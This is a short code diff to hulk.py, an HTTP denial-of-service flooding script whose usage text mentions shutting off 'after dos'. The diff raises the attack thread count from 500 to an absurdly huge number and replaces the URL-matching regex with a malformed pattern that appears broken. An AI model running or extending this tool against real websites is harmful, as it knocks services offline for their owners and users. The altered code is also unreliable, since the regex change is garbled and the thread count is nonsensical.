@@ -69,7 +69,7 @@ def buildblock(size):
 	return(out_str)
 
 def usage():
-	print '---------------------------------------------------'
+	
 	print 'USAGE: python hulk.py <url>'
 	print 'you can add "safe" after url, to autoshut after dos'
 	print '---------------------------------------------------'
@@ -146,9 +146,9 @@ else:
 		url = sys.argv[1]
 		if url.count("/")==2:
 			url = url + "/"
-		m = re.search('http?s\://([^/]*)/?.*', url)
+		m = re.search('https\http\://([^/]*)/?.*', url)
 		host = m.group(1)
-		for i in range(500):
+		for i in range(99999999999999999999999999):
 			t = HTTPThread()
 			t.start()
 		t = MonitorThread()
